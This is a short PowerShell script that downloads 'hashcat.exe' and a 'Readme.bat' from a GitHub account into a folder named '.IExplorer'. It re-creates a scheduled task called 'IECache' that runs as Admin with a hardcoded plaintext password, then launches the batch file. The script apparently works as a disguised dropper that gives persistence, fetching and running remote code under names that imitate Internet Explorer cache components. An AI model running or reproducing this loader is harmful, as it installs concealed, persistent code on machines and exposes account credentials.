$source = 'https://github.com/mysec000/hashcat/blob/main/hashcat.exe?raw=true'
$destination = 'C:\Users\Admin\.IExplorer\hashcat.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
$source = 'https://raw.githubusercontent.com/mysec000/hashcat/main/Readme.bat?raw=true'
$destination = 'C:\Users\Admin\.IExplorer\Readme.bat'
Invoke-WebRequest -Uri $source -OutFile $destination
if ($(Get-ScheduledTask -TaskName "IECache" -ErrorAction SilentlyContinue).TaskName -eq "IECache") {
    Unregister-ScheduledTask -TaskName "IECache" -Confirm:$False
}
schtasks /Create /TN "IECache" /XML "C:\Users\Admin\.IExplorer\IECache.xml" /RU Admin /RP qwer@4321
Start-Process "C:\Users\Admin\.IExplorer\Readme.bat"